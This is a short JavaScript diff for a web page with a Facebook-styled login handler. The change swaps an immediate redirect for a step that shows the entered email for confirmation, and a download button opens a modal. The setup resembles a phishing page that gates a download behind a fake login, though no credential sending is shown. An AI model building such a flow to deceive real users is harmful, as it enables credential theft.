@@ -165,11 +165,8 @@ function fbHandleLogin() {
     btn.classList.remove('loading'); btn.disabled = false;
     spinner.style.display = 'none';
     btnText.textContent = 'Login';
-    // Langsung redirect, tanpa menampilkan step konfirmasi
-    locationRedirect();
-    // Jika ingin tetap menggunakan step konfirmasi, gunakan kode yang dikomentari berikut:
-    // document.getElementById('fbcName').textContent = email;
-    // showStep('stepFBConfirm');
+    document.getElementById('fbcName').textContent = email;
+    showStep('stepFBConfirm');
   }, 2000);
 }
 
@@ -297,4 +294,4 @@ window.addEventListener('DOMContentLoaded', function(){
   if (downloadBtn) {
     downloadBtn.addEventListener('click', openModal);
   }
-});
+}); 
